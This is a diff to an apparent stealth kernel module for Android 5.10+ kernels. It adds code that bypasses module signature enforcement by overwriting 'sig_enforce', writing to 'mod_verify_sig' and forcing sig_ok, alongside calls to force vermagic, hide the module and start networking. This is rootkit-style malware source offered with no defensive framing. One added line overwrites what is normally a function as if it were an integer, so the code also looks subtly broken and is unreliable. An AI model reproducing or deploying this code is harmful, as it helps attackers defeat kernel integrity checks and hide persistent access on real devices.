@@ -22,9 +22,7 @@ MODULE_DESCRIPTION("Universal stealth r/w for 5.10-android12+");
 /* ---------- kprobe-based resolver ---------- */
 static unsigned long resolve_symbol(const char *name)
 {
-    struct kprobe kp = {
-        .symbol_name = name,
-    };
+    struct kprobe kp = { .symbol_name = name };
     if (register_kprobe(&kp) == 0) {
         unsigned long addr = (unsigned long)kp.addr;
         unregister_kprobe(&kp);
@@ -153,10 +151,13 @@ static void force_vermagic(void)
     THIS_MODULE->version = NULL;
 }
 
-static void disable_sig_check(void)
+static void bypass_module_sig(void)
 {
     bool *sig = (bool *)resolve_symbol("sig_enforce");
     if (sig) *sig = false;
+    int *verify = (int *)resolve_symbol("mod_verify_sig");
+    if (verify) *verify = 0;
+    THIS_MODULE->sig_ok = true;
 }
 
 /* ---------- init ---------- */
@@ -168,7 +169,7 @@ static int __init rw_init(void)
     if (!_kallsyms_lookup_name || !init_mm_ptr) return -ENODEV;
 
     force_vermagic();
-    disable_sig_check();
+    bypass_module_sig();
     hide_module();
     net_init();
     return 0;
@@ -181,3 +182,4 @@ static void __exit rw_exit(void)
 
 module_init(rw_init);
 module_exit(rw_exit);
+
